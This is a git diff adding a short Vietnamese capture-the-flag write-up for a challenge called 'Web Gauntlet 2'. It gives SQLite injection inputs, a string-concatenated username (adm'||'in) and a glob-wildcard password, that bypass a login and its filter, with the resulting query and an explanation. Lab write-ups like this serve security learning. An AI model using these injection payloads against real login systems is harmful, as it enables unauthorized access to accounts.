@@ -76,6 +76,28 @@ trong shell dấu ; cho phép thực thi nhiều lệnh liên tiếp
 
 
 
+# Web Gauntlet 2
+![Screenshot 2025-05-07 122359](https://github.com/user-attachments/assets/eaa96d1c-8151-43bd-b10b-7fd44dad9305)
+
+![image](https://github.com/user-attachments/assets/7f39cc63-2344-4762-810b-f24cf18d9deb)
+
+Username là admin nhưng admin đã bị chặn =))), Trong Sqlite || là toán tử để nối chuỗi
+>username: adm'||'in
+>password: ' glob '*
+SELECT username, password FROM users WHERE username='adm'||'in' AND password='' glob '*'
+
+Vậy tại sao có thể bypass được password, '' là 1 chuỗi rỗng glob sẽ so sánh với '\*' nếu khớp trả về true mà '*' khớp với bất kì chuỗi nào => trả về true
+![Screenshot 2025-05-07 123050](https://github.com/user-attachments/assets/98af7f57-76ce-450e-a32f-f8957c526564)
+![image](https://github.com/user-attachments/assets/596a372d-822f-4294-a861-af9f9301c260)
+
+
+
+
+
+
+
+
+
 
 
 
